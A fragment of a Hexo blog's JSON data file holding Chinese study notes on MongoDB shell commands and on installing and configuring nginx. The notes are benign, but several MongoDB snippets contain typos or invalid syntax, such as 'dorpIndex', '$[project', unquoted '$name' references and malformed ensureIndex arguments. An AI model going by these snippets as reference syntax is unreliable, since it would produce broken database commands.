db.collection.getIndexes():查询所有的索引\n删除索引：\n    db.collection.dorpIndex(&quot;索引名&quot;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Mongodb\"><a href=\"#Mongodb\" class=\"headerlink\" title=\"Mongodb\"></a>Mongodb</h1><blockquote>\n<ul>\n<li><p>全局说明:文档=字典=map=dict=json </p>\n</li>\n<li><p>$是mongodb的专用字符</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> mongodb-org<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"启动-服务器\"><a href=\"#启动-服务器\" class=\"headerlink\" title=\"启动(服务器):\"></a>启动(服务器):</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mongod start\n<span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mongod stop\n<span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mongod restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"启动客户端\"><a href=\"#启动客户端\" class=\"headerlink\" title=\"启动客户端\"></a>启动客户端</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">mongo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"服务环境\"><a href=\"#服务环境\" class=\"headerlink\" title=\"服务环境:\"></a>服务环境:</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">mongod://localhost:27017\nredis://localhost:6379\nmysql://localhost:3306\nnginx://localhost:8888\ntomcat://localhost:8080\nflask://localhost:5000\ndjango://localhost:8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h2 id=\"mongodb的命令\"><a href=\"#mongodb的命令\" class=\"headerlink\" title=\"mongodb的命令\"></a>mongodb的命令</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">show dbs: 查看有哪些数据库\nshow database: 查看有哪些数据库\nuse 数据库: 切换到某个数据库,如果没有,直接创建(如果被使用的数据库是没有的,那么也是可以用的,因为mongodb是会自动创建的,但是,如果在创建完成之后没有存入任何数据,那么这个表用完之后,也不会保存)\ndb: 查看当前数据库(代表当前数据库)\ndb.dropDatabase(): 删除当前使用的数据库\n\nmongodb没有表的概念 数据都存储在集合当中\n\n集合也是不需要自己创建的,可以在存入数据的时候,mongodb自动创建集合\n\n也可以手动创建集合\ndb.createCollection(name, options): name 是被创建的这个集合的名字,options是这个集合的一些属性约束,用一个字典来设置\ndb.createCollection(\"userinfo\",&#123;capped:true, size:10&#125;):表示的就是,创建一个叫做userinfo的集合,capped表示限制,默认false,无上限,size是在capped为true的时候设置,表示数据超过10字节的时候,就会被新的数据覆盖,把之前的数据往外挤\n\nshow cllections: 查看所有的集合\ndb.集合名.drop(): 删除给定的集合\ndb.集合名: 使用指定的集合\ndb.集合名.find(): 查询指定的集合中的数据\ndb.集合名.insert(&#123;\"name\": \"lqs\",\"age\":\"12\"&#125;): 往指定的集合插入数据\n\n这是一个Object类型(文档类型,字典),那么他会自动生成一个_id:ObjectId(\"xxxxxxx\"),保证文档的唯一性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"添加数据\"><a href=\"#添加数据\" class=\"headerlink\" title=\"添加数据\"></a>添加数据</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">db.集合名.insert(&#123;&#125;)\ndb.集合名.save(&#123;&#125;)\n两者的区别:\n    insert()的方式来添加数据的时候,是绝对添加,如果添加一个_id已经存在的数据,那么它会直接报错,说,如果添加一个_id已经存在\n    save()的方式来添加数据的时候,是相对添加,如果添加一个_id不存在的数据,就和insert()方法一样,如果添加一个_id已经存在的数据,那么就是替换这个数据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"文档插入\"><a href=\"#文档插入\" class=\"headerlink\" title=\"文档插入\"></a>文档插入</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">db.集合名.insert(&#123;_id:value,key:\"value\",key:\"value\",...&#125;): key是可以不用引起来,也可以引起,value根据具体数数据类型,字符串就引起,数字就不引起,_id如果自己不设置,系统就会自动生成<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"查询数据\"><a href=\"#查询数据\" class=\"headerlink\" title=\"查询数据\"></a>查询数据</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">美化查询:db.集合名.find().pretty():\n\ndb.集合名.find(): 查给定集合的所有数据\n\ndb.集合名.find(条件 根据这个条件查出对应的数据 字典格式, 返回的字段): 查询出给定集合里满足条件的所有数据\ndb.集合名.findOne(条件 根据这个条件查出对应的数据 字典格式): 查询出给定集合里满足条件的一条数据\n\n比较运算符\n    $lt: 小于\n    $lte: 小于等于\n    $gt: 大于\n    $gte: 大于等于\n    $ne: 不等\n使用例子:\n    db.collection.find(&#123;age:&#123;$lt:18&#125;&#125;):查询出collection集合中的年龄小于18的所有数据\n\n\n范围运算符:\n    $in: 范围是指定的范围给在数组中\n    $nin: 不在指定的范围的\n使用例子:\n    db.collection.find(&#123;age:&#123;$in:[12,45,23]&#125;&#125;):查询出collection集合中的年龄是12,23,45的人\n\n\n逻辑运算符:\n    与: 没有直接的运算符,直接写\n\n    $or       逻辑或\n    $and      逻辑与\n    $not      逻辑非\n    $nor      逻辑or的取反\n    $exists   存在逻辑\n    $type     查询键的数据类型\n使用例子:\n    db.collection.find(&#123;$or:[&#123;age:&#123;$lt:18&#125;&#125;,&#123;name:\"sc\"&#125;]&#125;):查询出collection中的年龄小于18或者名字等于sc的\n\n\n正则:\n    用/正则表达式/或者$regex:\"正则表达式\"编写正则表达式\n使用例子:\n    db.collection.find(&#123;name:/^abc/&#125;):查询名字是abc开头的\n    db.collection.find(&#123;name:&#123;$regex:\"123$\"&#125;&#125;):查询名字是123结尾的\n\n\nlimit和skip:\n    limit: 选中多少个\n    skip: 跳过多少个\n    配合使用的时候,先skip再limit\n使用例子:\n    db.collection.find().skip(2).limit(2):跳过两个再选中两个\n\n\n自定义查询(写js):\n    db.collection.find(&#123;$where:function()&#123;return this.age>30&#125;&#125;)\n    where可以执行一个函数,this就是表示当前collection中的数据,一条一条的来过this,类似于遍历<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h4 id=\"查询之后返回字段的过滤\"><a href=\"#查询之后返回字段的过滤\" class=\"headerlink\" title=\"查询之后返回字段的过滤\"></a>查询之后返回字段的过滤</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">db.collection.find(&#123;条件&#125;,&#123;name:1,_id:0 参数就是返回的字段,1为返回,不写不返回,除了_id,如果不想返回_id,那么_id:0&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.collection.find().sort(&#123;排序字段:1, 排序字段:-1&#125;): sort表示排序,1为升序,-1为降序<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"统计个数\"><a href=\"#统计个数\" class=\"headerlink\" title=\"统计个数\"></a>统计个数</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.collection.find(&#123;条件&#125;).count()\ndb.collection.count(&#123;条件&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"去重\"><a href=\"#去重\" class=\"headerlink\" title=\"去重\"></a>去重</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.collection.distinct(&quot;字段名字&quot;,&#123;条件&#125;): 返回的是一个列表,列表里面是不重复的<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"聚合查询\"><a href=\"#聚合查询\" class=\"headerlink\" title=\"聚合查询\"></a>聚合查询</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">管道:上层的结果给下层用\n$sum:总和,统计个数,$sum:1,以一倍计数\n$avg:平均\n$min:最小值\n$max:最大值\n$push:结果文档插入到一个数组中，\n$addToSet:结果文档插入到一个数组中,但不创建副本\n$first:根据资源文档排序获取第一个文档数据,\n$last:根据资源文档排序获取最后一个文档数据,\n$limit:显示多少个\n$skip:跳过多少个\n$sort:排序\n$project:修改输入文档的结构,如重命名\\添加\\删除字段,创建计算结果\n$unwind:将数组类型的字段进行拆分\n\n$match:相当于mysql中where\n$group:相当于mysql中group by\n\ndb.collection.aggregate(pipeline, options):语法:pipeline,管道,必须是一个数组\n格式:db.collection.aggregate([&#123;管道:&#123;表达式&#125;&#125;,&#123;管道:&#123;表达式&#125;&#125;])\n\n管道中使用字段:\n    不加$:在明确的条件中字段不用加$如&#123;name:&quot;lqs&quot;&#125;:这种表示name是lqs,冒号前面不加\n    加$:在不明确的使用值的时候加$如&#123;name2:$name&#125;:这种表示获取name的值,冒号后面加\n\n例子:\n    db.collection.aggregate([&#123;$match:&#123;name:&quot;lqs&quot;&#125;&#125;]):查出名字是lqs的\n    db.collection.aggregate([&#123;$match:&#123;_id:&#123;&quot;$gt&quot;:2&#125;&#125;&#125;,&#123;$group:&#123;_id:$name,aavg:&#123;$avg:$salary&#125;&#125;&#125;]):查出_id大于2的所有数据,在上面查出的数据中,再按照name分组,求出salary的平均,_id表示分组字段的key,分组字段必须加上$,在这里面出现的变量多用$修饰,aavg是别名这种有多个操作的,都是衔接的,必须下面能用\n    db.collection.aggregate([&#123;$group:&#123;_id:$name,maxM:&#123;$max:$salary&#125;,minM:&#123;$min:$salary&#125;&#125;&#125;]):分组查出最大最小\n    db.collection.aggregate([&#123;$group:&#123;_id:$sex,count:&#123;$sum:1&#125;&#125;&#125;]):分组统计男女生的总个数\n    db.collection.aggregate([&#123;$group:&#123;_id:null,count:&#123;$sum:1&#125;&#125;&#125;]):表示查出这个文档的个数,_id&#x3D;null的时候,表示整个文档为一组\n    上面的各种结果中都一定有一个_id字段,id表示分组依据\n    db.collection.aggregate([&#123;$group:&#123;_id:$gender,count:&#123;$sum:1&#125;&#125;&#125;,&#123;$[project:&#123;gender:$_id,count:1,_id:0&#125;]&#125;]):表示创建一个gender字段,值为上一个管道的_id的值,count:1表示显示这个字段,_id:0,表示不显示这个字段,也可以使用count:$count来显示,个之前的投影一样的1\\0操作\n\n    db.collection.aggregate([&#123;$sort:&#123;name:1&#125;&#125;]):按照姓名升序排序\n    db.collection.aggregate([\n        &#123;$group:&#123;_id:$gender,count:&#123;$sum:1&#125;&#125;&#125;,\n        &#123;$project:&#123;_id:0,gender:$_id.gender,count:1&#125;&#125;,\n        &#123;$sort:&#123;count:1&#125;&#125;\n    ]) 按照男女生总数升序排列\n    db.cllection.aggregate([\n        &#123;$skip:2&#125;,\n        &#123;$limit:2&#125;\n    ]) 跳过两条显示两条\n\n    原数据:&#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:[1,2,3]&#125;\n    db.collection.aggregate([&#123;$unwind:$size&#125;]):将上面的数据中的size对应的列表拆分成三个,这个管道只对列表有用\n    拆分后:\n        &#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:1&#125;\n        &#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:2&#125;\n        &#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:3&#125;\n\n\n    高级使用:\n    db.collection.aggregate([\n        &#123;$group:&#123;_id:&#123;conutry:$conutry,prevent:$prevent,userid:$userid&#125;&#125;&#125;, 将不同国家的不同省份的用户分出来userid用于去重\n        &#123;$group:&#123;_id:&#123;conutry:$_id.conutry,prevent:$_id.prevent&#125;,conunt:&#123;$sum:1&#125;&#125;&#125;, 在将以上分好的用国家和省份分组统计出总个数\n        &#123;$project:&#123;_id:0,conutry:$_id.conutry,prevent:$_id.prevent,conunt:1&#125;&#125; 显示某个国家某个地区的总人数\n    ])<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"更新数据\"><a href=\"#更新数据\" class=\"headerlink\" title=\"更新数据\"></a>更新数据</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.集合名.update(&#123;条件 根据这个条件查出对应的数据 字典格式&#125;,&#123;把查到的数据更新成什么 字典格式&#125;,&#123;multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据&#125;)\n    这种方式不是简单的更新,这种属于是替换\ndb.集合名.update(&#123;条件 根据这个条件查出对应的数据 字典格式&#125;,&#123;$set:把查到的数据更新成什么 字典格式&#125;,&#123;multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据&#125;)\n    这种方式就是更新,不会把本不该更新的键值对也替换了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.集合名.remove(&#123;条件 根据这个条件查出对应的数据 字典格式&#125;,&#123;justOne:true&#125;)\n\n    justOne表示是否只删除一条,如果是false,那么删除满足条件的所有数据,默认false<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">Object ID: 文档ID\nString: 字符串,最常用,必须是utf-8\nBoolean: 存储一个布尔,true或者false\nInteger: 整数,可以是32位\\64位\nDouble: 浮点数\nArrays: 数组或者列表,多个值存入一个键\nObject: 用于嵌入式的文档,即一个值为一个文档\nNull: 存储Null值\nTimestamp: 时间戳,表示从1970-1-1到现在的总秒数\nData: 存储当前日期或者时间的UNIX时间格式,在mongodb中可以通过new Date(日期)来使用,存入的是年月日\n\n\n说明:\n    文档:要存入数据库中的字典,可以是各种嵌套的字典\n\n    每一个文档都有一个固定的属性 _id 会自动生成(12字节的十六进制数),多数时间自己设置_id,为了保证唯一性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n<h3 id=\"索引\"><a href=\"#索引\" class=\"headerlink\" title=\"索引\"></a>索引</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">创建索引:\n    db.collection.ensureIndex(&#123;&quot;索引字段&quot;,排序方式1升序-1降序&#125;,&#123;&quot;索引字段&quot;,&quot;取得名字&quot;&#125;):索引的创建\\取名\n查询索引:\n    db.collection.getIndexes():查询所有的索引\n删除索引：\n    db.collection.dorpIndex(&quot;索引名&quot;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"nginx搭建","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T08:32:38.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"nginx搭建","_content":"# Nginx\n\n## 各种方式安装的nginx的启动方式\n### 通过命令行安装\n```shell\napt install nginx\n/etc/init.d/nginx start     # 启动\n/etc/init.d/nginx stop      # 停止\n/etc/init.d/nginx restart   # 重启\n```\n### 通过docker安装\n```\ndocker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启\n```\n### 通过编译安装\n```\n/xx/xx/nginx/sbin/nginx # 启动\n/xx/xx/nginx/sbin/nginx -s reload # 重启\nps -ef | grep nginx && kill xxxx # 关闭\nkill -9 nginx # 强制关闭\n```\n\n## nginx概念\nNginx 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务\n\n### Nginx特色\n```\n1.反向代理:\n正向代理：客户端配置代理服务器，通过代理服务器进行互联网访问\n反向代理：客户端将请求发送给反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外来说就是一个服务器，暴露得是反向代理服务器的地址，隐藏了真正的服务器地址\n2、负载均衡（并发性能提升）：\n在客户端发送多次请求的时候，将请求分发到不同的服务器上\n3、动静分离：\n为了提升网站的解析速度，可以将静态页面和动态页面由不同的服务器来解析，加快解析速度，降低原本单个服务器的压力\n```\n\n### nginx的安装\n\n```\nnginx:安装的本体（nginx.org）\n依赖：\nopenssl:支持nginx开通https的模块，非对称加密的工具（选择性下载）(https://www.openssl.org/）\nzlib:是一款支持zlib压缩的模块(zlib.net)(必须下载)\npcre:是一个支持正则表达式的模块（www.pcre.org）（必须下载）\n\n都下载好以后就在usr/share/下面创建一个nginx文件夹\n将下载好的文件解压到nginx文件夹下\n\n安装C语言编译工具：\napt install gcc\napt install build-essential\napt install make\n\n进入解压好的nginx里面：\n./configure --with-http_ssl_module --with-openssl=../opensslx-x-x  --with-pcre=../pcrex-x-x --with-zlib=../zlibx-x-x\n\n这个命令可以将模块加载进入nginx\n\n然后用make命令编译一下\nmake install安装一下\n\n安装在/usr/local/nginx/下面\n\n进入这个目录\n启动：\n    进入sbin执行./nginx\n重启：\n    ./nginx -s reload\n关闭：\n    pkill -9 nginx强制关闭\n    ./nginx -s stop\n配置：\n    进入conf，vim编辑nginx.conf配置nginx\n    \n```\n            \n            \n## 基本使用\n### 配置文件：全局块，events块，http块\n\n```\n\nworker_processes  1; # 线程数\n\n\nevents {\n    worker_connections  1024; #最大连接数\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n\n    upstream xxx {\n        # ip_hash # 每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n\n        server 10.0.6.108:7080 weight=2; # 权重越大被访问的次数就越多，默认是1，轮询 \n        server 10.0.0.85:8980 weight=4; \n\n        # fair # 按后端服务器的响应时间来分配请求，响应时间短的优先分配。与weight分配策略类似。\n        # 这三种决策使用其中之一就可以  \n        # 这个用于实现负载均衡\n        # 在location使用：proxy_pass http://xxx就可以\n    }\n\n\n\n    server {\n    listen       80;\n    server_name  localhost;\n\n    # location的一些修饰符：\n    # = 用于精确匹配\n    # ~ 用于区分大小写的正则匹配，模糊匹配\n    # ~* 用于不区分大小写的正则匹配，模糊匹配\n    # ^~ 用于字符串前缀匹配，找到最长匹配（高位匹配最多的，做完美的），然后停止查找\n\n    # ^~的优先级大于正则\n\n\n    location ~ /group[0-9]/ {\n            ngx_fastdfs_module;\n        }\n\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n            root   html;\n        }\n    }\n\n\n    # server在http中可以有多个\n    # location在server中也可以有多个，用于解决动静分离的时候可以用\n}\n```\n\n#### 反向代理 \n通过proxy_pass 地址","source":"_posts/nginx搭建.md","raw":"---\ntitle: nginx搭建\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 16:32:38\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: nginx搭建\ntags: nginx\ncategories: 工具\n---\n# Nginx\n\n## 各种方式安装的nginx的启动方式\n### 通过命令行安装\n```shell\napt install nginx\n/etc/init.d/nginx start     # 启动\n/etc/init.d/nginx stop      # 停止\n/etc/init.d/nginx restart   # 重启\n```\n### 通过docker安装\n```\ndocker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启\n```\n### 通过编译安装\n```\n/xx/xx/nginx/sbin/nginx # 启动\n/xx/xx/nginx/sbin/nginx -s reload # 重启\nps -ef | grep nginx && kill xxxx # 关闭\nkill -9 nginx # 强制关闭\n```\n\n## nginx概念\nNginx 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务\n\n### Nginx特色\n```\n1.反向代理:\n正向代理：客户端配置代理服务器，通过代理服务器进行互联网访问\n反向代理：客户端将请求发送给反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外来说就是一个服务器，暴露得是反向代理服务器的地址，隐藏了真正的服务器地址\n2、负载均衡（并发性能提升）：\n在客户端发送多次请求的时候，将请求分发到不同的服务器上\n3、动静分离：\n为了提升网站的解析速度，可以将静态页面和动态页面由不同的服务器来解析，加快解析速度，降低原本单个服务器的压力\n```\n\n### nginx的安装\n\n```\nnginx:安装的本体（nginx.org）\n依赖：\nopenssl:支持nginx开通https的模块，非对称加密的工具（选择性下载）(https://www.openssl.org/）\nzlib:是一款支持zlib压缩的模块(zlib.net)(必须下载)\npcre:是一个支持正则表达式的模块（www.pcre.org）（必须下载）\n\n都下载好以后就在usr/share/下面创建一个nginx文件夹\n将下载好的文件解压到nginx文件夹下\n\n安装C语言编译工具：\napt install gcc\napt install build-essential\napt install make\n\n进入解压好的nginx里面：\n./configure --with-http_ssl_module --with-openssl=../opensslx-x-x  --with-pcre=../pcrex-x-x --with-zlib=../zlibx-x-x\n\n这个命令可以将模块加载进入nginx\n\n然后用make命令编译一下\nmake install安装一下\n\n安装在/usr/local/nginx/下面\n\n进入这个目录\n启动：\n    进入sbin执行./nginx\n重启：\n    ./nginx -s reload\n关闭：\n    pkill -9 nginx强制关闭\n    ./nginx -s stop\n配置：\n    进入conf，vim编辑nginx.conf配置nginx\n    \n```\n            \n            \n## 基本使用\n### 配置文件：全局块，events块，http块\n\n```\n\nworker_processes  1; # 线程数\n\n\nevents {\n    worker_connections  1024; #最大连接数\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n\n    upstream xxx {\n        # ip_hash # 每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n\n        server 10.0.6.108:7080 weight=2; # 权重越大被访问的次数就越多，默认是1，轮询 \n        server 10.0.0.85:8980 weight=4; \n\n        # fair # 按后端服务器的响应时间来分配请求，响应时间短的优先分配。与weight分配策略类似。\n        # 这三种决策使用其中之一就可以  \n        # 这个用于实现负载均衡\n        # 在location使用：proxy_pass http://xxx就可以\n    }\n\n\n\n    server {\n    listen       80;\n    server_name  localhost;\n\n    # location的一些修饰符：\n    # = 用于精确匹配\n    # ~ 用于区分大小写的正则匹配，模糊匹配\n    # ~* 用于不区分大小写的正则匹配，模糊匹配\n    # ^~ 用于字符串前缀匹配，找到最长匹配（高位匹配最多的，做完美的），然后停止查找\n\n    # ^~的优先级大于正则\n\n\n    location ~ /group[0-9]/ {\n            ngx_fastdfs_module;\n        }\n\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n            root   html;\n        }\n    }\n\n\n    # server在http中可以有多个\n    # location在server中也可以有多个，用于解决动静分离的时候可以用\n}\n```\n\n#### 反向代理 \n通过proxy_pass 地址","slug":"nginx搭建","published":1,"updated":"2023-03-10T02:54:53.597Z","_id":"cld2uqf6d000a1svkganhgsee","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h1><h2 id=\"各种方式安装的nginx的启动方式\"><a href=\"#各种方式安装的nginx的启动方式\" class=\"headerlink\" title=\"各种方式安装的nginx的启动方式\"></a>各种方式安装的nginx的启动方式</h2><h3 id=\"通过命令行安装\"><a href=\"#通过命令行安装\" class=\"headerlink\" title=\"通过命令行安装\"></a>通过命令行安装</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">apt</span> <span class=\"token function\">install</span> nginx\n/etc/init.d/nginx start     <span class=\"token comment\"># 启动</span>\n/etc/init.d/nginx stop      <span class=\"token comment\"># 停止</span>\n/etc/init.d/nginx restart   <span class=\"token comment\"># 重启</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"通过docker安装\"><a href=\"#通过docker安装\" class=\"headerlink\" title=\"通过docker安装\"></a>通过docker安装</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">docker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"通过编译安装\"><a href=\"#通过编译安装\" class=\"headerlink\" title=\"通过编译安装\"></a>通过编译安装</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;xx&#x2F;xx&#x2F;nginx&#x2F;sbin&#x2F;nginx # 启动\n&#x2F;xx&#x2F;xx&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload # 重启\nps -ef | grep nginx &amp;&amp; kill xxxx # 关闭\nkill -9 nginx # 强制关闭<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"nginx概念\"><a href=\"#nginx概念\" class=\"headerlink\" title=\"nginx概念\"></a>nginx概念</h2><p>Nginx 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务</p>\n<h3 id=\"Nginx特色\"><a href=\"#Nginx特色\" class=\"headerlink\" title=\"Nginx特色\"></a>Nginx特色</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1.反向代理:\n正向代理：客户端配置代理服务器，通过代理服务器进行互联网访问\n反向代理：客户端将请求发送给反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外来说就是一个服务器，暴露得是反向代理服务器的地址，隐藏了真正的服务器地址\n2、负载均衡（并发性能提升）：\n在客户端发送多次请求的时候，将请求分发到不同的服务器上\n3、动静分离：\n为了提升网站的解析速度，可以将静态页面和动态页面由不同的服务器来解析，加快解析速度，降低原本单个服务器的压力<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"nginx的安装\"><a href=\"#nginx的安装\" class=\"headerlink\" title=\"nginx的安装\"></a>nginx的安装</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">nginx:安装的本体（nginx.org）\n依赖：\nopenssl:支持nginx开通https的模块，非对称加密的工具（选择性下载）(https:&#x2F;&#x2F;www.openssl.org&#x2F;）\nzlib:是一款支持zlib压缩的模块(zlib.net)(必须下载)\npcre:是一个支持正则表达式的模块（www.pcre.org）（必须下载）\n\n都下载好以后就在usr&#x2F;share&#x2F;下面创建一个nginx文件夹\n将下载好的文件解压到nginx文件夹下\n\n安装C语言编译工具：\napt install gcc\napt install build-essential\napt install make\n\n进入解压好的nginx里面：\n.&#x2F;configure --with-http_ssl_module --with-openssl&#x3D;..&#x2F;opensslx-x-x  --with-pcre&#x3D;..&#x2F;pcrex-x-x --with-zlib&#x3D;..&#x2F;zlibx-x-x\n\n这个命令可以将模块加载进入nginx\n\n然后用make命令编译一下\nmake install安装一下\n\n安装在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;下面\n\n进入这个目录\n启动：\n    进入sbin执行.&#x2F;nginx\n重启：\n    .&#x2F;nginx -s reload\n关闭：\n    pkill -9 nginx强制关闭\n    .&#x2F;nginx -s stop\n配置：\n    进入conf，vim编辑nginx.conf配置nginx\n    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"配置文件：全局块，events块，http块\"><a href=\"#配置文件：全局块，events块，http块\" class=\"headerlink\" 